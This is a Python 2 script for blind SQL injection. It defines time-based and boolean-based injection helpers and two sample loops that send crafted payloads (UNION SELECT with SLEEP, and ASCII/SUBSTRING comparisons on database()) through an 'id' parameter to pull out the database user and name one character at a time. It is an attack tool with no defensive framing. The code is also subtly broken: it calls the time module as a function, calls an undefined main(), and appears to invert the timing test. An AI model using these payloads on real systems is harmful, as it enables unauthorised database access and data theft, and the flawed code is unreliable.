#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import requests


def timeInject(session, url, payload, method, threshold, cookies={}):

    start = time()

    if method == 'GET':
        r = session.get(url, params=payload, cookies=cookies)
    elif method == 'POST':
        r = session.post(url, data=payload, cookies=cookies)

    interval = int(time() - start)

    # print(r.text)
    # print('interval',interval)

    if interval < threshold:
        return True
    else:
        return False


def boolInject(session, url, payload, method, keyword, cookies={}):

    if method == 'GET':
        r = session.get(url, params=payload, cookies=cookies)
    elif method == 'POST':
        r = session.post(url, data=payload, cookies=cookies)

    the_page = r.text

    # print(the_page)

    if keyword not in the_page:
        return True
    else:
        return False


def timeSample():

    s = requests.session()

    url = 'http://localhost'

    method = 'GET'
    keyword = 'no result'

    interval = 1
    cookies = {}
    # print(url)

    db = ''
    pos = 1
    mid = 256
    guess = 0

    while pos < 15:

        mid /= 2
        # print mid

        idpayload = '1 UNION SELECT IF( ASCII( SUBSTRING( user( ) , '
        idpayload += str(pos)
        idpayload += ', 1 ) ) &'
        idpayload += str(mid)
        idpayload += ' = 0, SLEEP( 2 ) , 1 ) , 1, 1 -- + '
        payload = {'id': idpayload}

        if mid == 0:
            mid = 256
            pos += 1
            db += chr(guess)
            print 'db', db
            guess = 0

        else:
            guess <<= 1
            guess += timeInject(s, url, payload, method, interval, cookies)
            # print('guess',guess)


def boolSample():

    s = requests.session()

    url = 'http://localhost'
    method = 'GET'
    keyword = 'no result'
    cookies = {}
    # print(url)

    db = ''
    pos = 1
    minasc = 1
    maxasc = 127

    while pos < 9:

        mid = (maxasc + minasc) / 2

        idpayload = '1 and ASCII(SUBSTRING(database(),'
        idpayload += str(pos)
        idpayload += ',1)) > '
        idpayload += str(mid) + ' -- + '
        payload = {'id': idpayload}

        if maxasc - minasc <= 1:
            minasc = 1
            maxasc = 127
            pos += 1
            db += chr(mid + 1)
            print db
        else:

            if boolInject(s, url, payload, method, keyword, cookies):
                minasc = mid
            else:
                maxasc = mid


if __name__ == '__main__':
    main()
